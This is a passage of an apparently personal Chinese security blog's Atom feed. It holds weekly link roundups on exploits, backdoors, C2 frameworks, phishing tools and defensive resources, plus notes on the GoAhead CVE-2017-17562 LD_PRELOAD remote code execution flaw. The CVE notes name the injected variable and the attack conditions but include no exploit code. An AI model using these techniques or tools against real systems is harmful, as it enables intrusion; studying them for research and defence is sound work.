<li>渗透测试中的 Go 语言使用：编写反弹后门 Hershell<br><a href="https://sysdream.com/news/lab/2018-01-15-en-golang-for-pentests-hershell/" target="_blank" rel="external">https://sysdream.com/news/lab/2018-01-15-en-golang-for-pentests-hershell/</a></li>
<li>腾讯2017年度网络黑产威胁源研究报告<br><a href="https://book.yunzhan365.com/odqt/yzzl/mobile/index.html#p=1" target="_blank" rel="external">https://book.yunzhan365.com/odqt/yzzl/mobile/index.html#p=1</a></li>
<li>成为 THreat hunter,用 KOLIDE FLEET、OSQUERY、POWERSHELL EMPIRE 以及 CALDERA 搭建威胁狩猎环境<br><a href="https://holdmybeersecurity.com/2018/01/16/part-2a-intro-to-threat-hunting-with-kolide-fleet-osquery-powershell-empire-and-caldera-setup-environment/" target="_blank" rel="external">https://holdmybeersecurity.com/2018/01/16/part-2a-intro-to-threat-hunting-with-kolide-fleet-osquery-powershell-empire-and-caldera-setup-environment/</a></li>
<li>awesome-threat-detection - 威胁检测与追击方面的资源集<br><a href="https://github.com/0x4D31/awesome-threat-detection" target="_blank" rel="external">https://github.com/0x4D31/awesome-threat-detection</a></li>
<li>Linux 堆溢出漏洞利用系列之 libc 2.23/2.24 vfprintf 的 Double Free 漏洞分析<br><a href="https://sensepost.com/blog/2018/linux-heap-exploitation-intro-series-bonus-printf-might-be-leaking/" target="_blank" rel="external">https://sensepost.com/blog/2018/linux-heap-exploitation-intro-series-bonus-printf-might-be-leaking/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;RPO攻击技术浅析&lt;br&gt;&lt;a href=&quot;http://blog.nsfocus.net/rp
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180103安全动态</title>
    <link href="http://kevien.github.io/2018/01/03/20180103%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/01/03/20180103安全动态/</id>
    <published>2018-01-03T14:38:35.000Z</published>
    <updated>2018-01-05T06:47:55.856Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>RSAP技术分析<br><a href="http://blog.nsfocus.net/rsap-tech/" target="_blank" rel="external">http://blog.nsfocus.net/rsap-tech/</a></li>
<li>ropchain：ASLR + DEP + stack canaries 绕过<br><a href="http://www.kvakil.me/posts/ropchain/" target="_blank" rel="external">http://www.kvakil.me/posts/ropchain/</a></li>
<li>Command and Control - Images，在图片中隐藏命令和 Payload 实现 C&amp;C 控制<br><a href="https://pentestlab.blog/2018/01/02/command-and-control-images/" target="_blank" rel="external">https://pentestlab.blog/2018/01/02/command-and-control-images/</a></li>
<li>wifiphisher - 自动化 WiFi 钓鱼工具<br><a href="https://github.com/wifiphisher/wifiphisher" target="_blank" rel="external">https://github.com/wifiphisher/wifiphisher</a></li>
<li>追查黑客行为：发现与检测横向渗透的方法<br><a href="https://www.botconf.eu/wp-content/uploads/2017/12/2017_tomonaga-muda-Hunting-Attacker-Activities.pdf" target="_blank" rel="external">https://www.botconf.eu/wp-content/uploads/2017/12/2017_tomonaga-muda-Hunting-Attacker-Activities.pdf</a></li>
<li>safe-commit-hook - Git pre-commit hook，在提交前检测本次提交是否包含敏感文件<br><a href="https://github.com/jandre/safe-commit-hook" target="_blank" rel="external">https://github.com/jandre/safe-commit-hook</a></li>
<li><p>基于 Web 控制的 C&amp;C 后门 - Ares 的介绍<br><a href="https://pentestlab.blog/2018/01/03/command-and-control-web-interface/" target="_blank" rel="external">https://pentestlab.blog/2018/01/03/command-and-control-web-interface/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">控制端用web还是挺创新的，只是感觉不如传统的功能多，且会被大多杀软查杀。</div></pre></td></tr></table></figure>
</li>
<li><p>explodingcan - IIS WebDav 远程溢出漏洞利用程序（CVE-2017-7269）<br><a href="https://github.com/danigargu/explodingcan" target="_blank" rel="external">https://github.com/danigargu/explodingcan</a></p>
</li>
<li>python http.server open redirect vulnerability<br><a href="https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html</a></li>
<li>Cloak is an intelligent python backdoor framework.<br><a href="https://github.com/UltimateHackers/Cloak" target="_blank" rel="external">https://github.com/UltimateHackers/Cloak</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">其实就是向python脚本中插入加密代码</div></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;RSAP技术分析&lt;br&gt;&lt;a href=&quot;http://blog.nsfocus.net/rsa
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20171225安全动态</title>
    <link href="http://kevien.github.io/2017/12/25/20171225%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/12/25/20171225安全动态/</id>
    <published>2017-12-24T16:50:53.000Z</published>
    <updated>2018-01-13T15:16:25.629Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>Linux 上 ELF 可执行文件的理解与分析<br><a href="https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/" target="_blank" rel="external">https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/</a></li>
<li>加固 C / C ++ 程序 Part 1 - 堆栈保护器<br>&lt; <a href="http://www.productive-cpp.com/hardening-cpp-programs-stack-protector/&gt;" target="_blank" rel="external">http://www.productive-cpp.com/hardening-cpp-programs-stack-protector/&gt;</a><br><a href="http://www.productive-cpp.com/hardening-cpp-programs-executable-space-protection-address-space-layout-randomization-aslr/" target="_blank" rel="external">http://www.productive-cpp.com/hardening-cpp-programs-executable-space-protection-address-space-layout-randomization-aslr/</a></li>
<li>利用 Docker 构建命令控制服务器<br><a href="https://blog.obscuritylabs.com/docker-command-controll-c2/" target="_blank" rel="external">https://blog.obscuritylabs.com/docker-command-controll-c2/</a></li>
<li>Java 应用程序中是如何发生内存泄漏的<br><a href="https://stackify.com/memory-leaks-java/" target="_blank" rel="external">https://stackify.com/memory-leaks-java/</a></li>
<li>fuzzing 入门指南<br>&lt; <a href="https://fuzzing-project.org/tutorial1.html&gt;" target="_blank" rel="external">https://fuzzing-project.org/tutorial1.html&gt;</a></li>
<li>代码签名证书的克隆攻击与防御<br><a href="https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec" target="_blank" rel="external">https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec</a></li>
<li>Linux 堆利用系列之Double free attacks<br><a href="https://sensepost.com/blog/2017/linux-heap-exploitation-intro-series-riding-free-on-the-heap-double-free-attacks/" target="_blank" rel="external">https://sensepost.com/blog/2017/linux-heap-exploitation-intro-series-riding-free-on-the-heap-double-free-attacks/</a></li>
<li><p>parameth - GET / POST 参数暴力破解工具<br><a href="https://github.com/maK-/parameth" target="_blank" rel="external">https://github.com/maK-/parameth</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">某天可能会用到</div></pre></td></tr></table></figure>
</li>
<li><p>jexboss - Jboss 及 Java 反序列化漏洞利用工具:<br><a href="https://github.com/joaomatosf/jexboss" target="_blank" rel="external">https://github.com/joaomatosf/jexboss</a></p>
</li>
<li><p>Botconf 2017 大部分议题材料已经放出<br><a href="https://www.botconf.eu/botconf-2017/programme/botconf-2017-talks/" target="_blank" rel="external">https://www.botconf.eu/botconf-2017/programme/botconf-2017-talks/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">有几个议题不错啊</div></pre></td></tr></table></figure>
</li>
<li><p>2017 Mac 恶意软件盘点<br><a href="https://objective-see.com/blog/blog_0x25.html" target="_blank" rel="external">https://objective-see.com/blog/blog_0x25.html</a></p>
</li>
<li>基于 Windows 的日志转发（Event Forwarding）和微软的交互式数据可视化 BI 工具 Power BI 构建一个高效、免费的威胁发现、应急响应平台<br><a href="https://blogs.technet.microsoft.com/jepayne/2017/12/08/weffles/" target="_blank" rel="external">https://blogs.technet.microsoft.com/jepayne/2017/12/08/weffles/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Linux 上 ELF 可执行文件的理解与分析&lt;br&gt;&lt;a href=&quot;https://linu
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>有关CVE-2017-17562的一些零碎点</title>
    <link href="http://kevien.github.io/2017/12/24/CVE-2017-17562%E7%9A%84%E4%B8%80%E4%BA%9B%E9%9B%B6%E7%A2%8E%E7%82%B9/"/>
    <id>http://kevien.github.io/2017/12/24/CVE-2017-17562的一些零碎点/</id>
    <published>2017-12-24T08:10:00.000Z</published>
    <updated>2018-01-19T10:57:08.477Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
<li>前两天看到这个漏洞的时候感觉还是挺有意思的，让我想起了之前分析的nginx提权漏洞(CVE-2016-1247)以及shellshock漏洞(CVE-2014-6271),前两天只是简单的看了一下，今天有时间就整理一下，留个备忘。</li>
<li>goAHead是一个使用c语言实现的一个简单web服务器，主要用在嵌入式设备上，官方给出的一句话描述也是simple，secure Embedded web server，官方说有亿万的设备在使用(夸张了吧？)，其中有像是hp、oracle、西门子、摩托罗拉等。详细可以看向这里<a href="https://embedthis.com/goahead/" target="_blank" rel="external">https://embedthis.com/goahead/</a><h4 id="CVE-2016-1247简单介绍"><a href="#CVE-2016-1247简单介绍" class="headerlink" title="CVE-2016-1247简单介绍"></a>CVE-2016-1247简单介绍</h4></li>
<li>这个漏洞可以导致GoAhead web服务器在小于3.6.5版本远程代码执行。攻击者通过发送一个恶意的http请求，利用开启了CGI功能的goAhead的服务器，从而进行远程代码执行。其中exp是利用到了向新的进程中注入环境变量这种比较基本的攻击方式。<br></li>
<li>具体需要的条件主要有如下：<br><br>1.GoAhead开启CGI功能，即有cgi的处理页面(关于GoAhead cgi的使用可以看向这里<a href="https://embedthis.com/goahead/doc/users/cgi.html" target="_blank" rel="external">https://embedthis.com/goahead/doc/users/cgi.html</a>)<br>2.需要GoAhead版本低于3.6.5<br>3.需要动态链接glibc库(默认是动态链接的)<h4 id="具体"><a href="#具体" class="headerlink" title="具体"></a>具体</h4></li>
<li>在英文原版文章中作者已经分析了glibc是如何加载和处理环境变量、GoAhead如何处理cgi以及linux的procfs的符号链接如何指向输入描述符等，我这里就不细分析了。下面只是放几张测试的图片。<br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/origin.png" alt=""><br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/poc.png" alt=""><br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/afterpoc.png" alt=""><br>(a.html extract from wireshark)<br>可以看到，打过payload之后，页面返回的环境变量多了一个LD_PRELOAD=/proc/self/fd/0的键值对。<br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/proc.png" alt=""><br>可以看到，cgi处理进程符号链接指向的tmp文件和我们的payload是相同的。<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li>
<li>这个漏洞利用的难点在于怎么将动态链接库注入到远程服务器，作者这里提供了一个很好的思路就是利用到了/proc/self/fd/0（它对应了文件的stdin文件描述符）这个文件就链接到了我们上传的文件</li>
<li>就像英文原版文章的标题一样，这个漏洞的精髓就是利用ld_preload来进行exploit，这个思路很新颖，后面可能会有其它的漏洞用到这个思路和方法。<h4 id="漏洞引申1-有关nginx提权"><a href="#漏洞引申1-有关nginx提权" class="headerlink" title="漏洞引申1-有关nginx提权"></a>漏洞引申1-有关nginx提权</h4></li>
<li>漏洞分析文章见这里<br><a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="external">Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">作者的poc shell脚本写的不错</div></pre></td></tr></table></figure>
</li>
</ul>
<p><a href="http://blog.knownsec.com/2016/11/nginx-exploit-deb-root-privesc-cve-2016-1247/" target="_blank" rel="external">Nginx权限提升漏洞(CVE-2016-1247) 分析</a></p>
<ul>
<li>之前简单研究过nginx的提权漏洞，和这次的漏洞有一些像，也用到了环境变量，nginx的这个漏洞用到了写入恶意动态链接库路径到/etc/ld.so.preload。<h4 id="漏洞引申2-有关shellshock"><a href="#漏洞引申2-有关shellshock" class="headerlink" title="漏洞引申2-有关shellshock"></a>漏洞引申2-有关shellshock</h4></li>
<li>对比shellshock，这个漏洞要需要的条件苛刻很多，shellshock简单粗暴，而且shellshock的影响范围也更广。<br><a href="http://www.vuln.cn/6476" target="_blank" rel="external">Shellshock漏洞回顾与分析测试 - Debug_Orz</a><h4 id="漏洞引申3-其它"><a href="#漏洞引申3-其它" class="headerlink" title="漏洞引申3-其它"></a>漏洞引申3-其它</h4></li>
<li>在github上看这个项目的一些cve issue <br><br><a href="https://github.com/embedthis/goahead/issues?page=1&amp;q=label%3Acve+is%3Aclosed" target="_blank" rel="external">https://github.com/embedthis/goahead/issues?page=1&amp;q=label%3Acve+is%3Aclosed</a><br><br>还是有很多东西值得学习的(基本上可以看到开发一个web服务器可能会遇到的安全问题）<br><br>比如这个issue <a href="https://github.com/embedthis/goahead/issues/241" target="_blank" rel="external">https://github.com/embedthis/goahead/issues/241</a>中，某位安全研究员提的报告<br><a href="https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html" target="_blank" rel="external">https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html</a></li>
<li>As I’m a fan of looking at the source    –author <br><br>向作者学习，安全有个好处就是我们可以透过现象看本质，研究原理很有意思。</li>
<li>有关patch，原文中作者也说了，漏洞的修复只是过滤了几个特殊的参数名，有可能会被绕过，期待大牛们绕过的思路。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://www.elttam.com.au/blog/goahead/" target="_blank" rel="external">REMOTE LD_PRELOAD EXPLOITATION</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;前两天看到这个漏洞的时候感觉还是挺有意思的，让我想起了之前分析的nginx提权漏洞(CVE-2016-1
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20171218安全动态</title>
    <link href="http://kevien.github.io/2017/12/18/20171218%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/12/18/20171218安全动态/</id>
    <published>2017-12-18T06:23:28.000Z</published>
    <updated>2017-12-20T11:41:54.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>漏洞利用缓解技术之数据执行保护(DEP)<br><a href="https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634" target="_blank" rel="external">https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634</a></li>
<li>SHADOW ON THE WALL - Shadowsocks 流量的检测、解密、与命令执行漏洞<br><a href="https://x41-dsec.de/security/news/2017/12/18/x41-shadow-on-the-wall/" target="_blank" rel="external">https://x41-dsec.de/security/news/2017/12/18/x41-shadow-on-the-wall/</a></li>
<li>基于r2的逆向基础 radare2<br><a href="https://sec.xiaomi.com/article/30" target="_blank" rel="external">https://sec.xiaomi.com/article/30</a></li>
<li><p>shell中&gt;/dev/null 2&gt;&amp;1是什么鬼？<br><a href="http://www.kissyu.org/2016/12/25/shell%E4%B8%AD%3E%20:dev:null%202%20%3E%20&amp;1%E6%98%AF%E4%BB%80%E4%B9%88%E9%AC%BC%EF%BC%9F/" target="_blank" rel="external">http://www.kissyu.org/2016/12/25/shell%E4%B8%AD%3E%20:dev:null%202%20%3E%20&amp;1%E6%98%AF%E4%BB%80%E4%B9%88%E9%AC%BC%EF%BC%9F/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">学习了</div></pre></td></tr></table></figure>
</li>
<li><p>Invoke-Obfuscation 用例指南 Part 2<br><a href="http://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide-part-2" target="_blank" rel="external">http://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide-part-2</a></p>
</li>
<li>merlin - 使用 HTTP 通信的跨平台后渗透测试工具<br><a href="https://github.com/Ne0nd0g/merlin" target="_blank" rel="external">https://github.com/Ne0nd0g/merlin</a></li>
<li>ropa - 基于 Ropper 实现的一个 GUI 版本的 ROP 链构造工具<br><a href="https://github.com/orppra/ropa" target="_blank" rel="external">https://github.com/orppra/ropa</a></li>
<li>remote ld_preload exploitation<br><a href="https://www.elttam.com.au/blog/goahead/" target="_blank" rel="external">https://www.elttam.com.au/blog/goahead/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;漏洞利用缓解技术之数据执行保护(DEP)&lt;br&gt;&lt;a href=&quot;https://0x00sec
    
    </summary>
    
    
  </entry>
  
</feed>
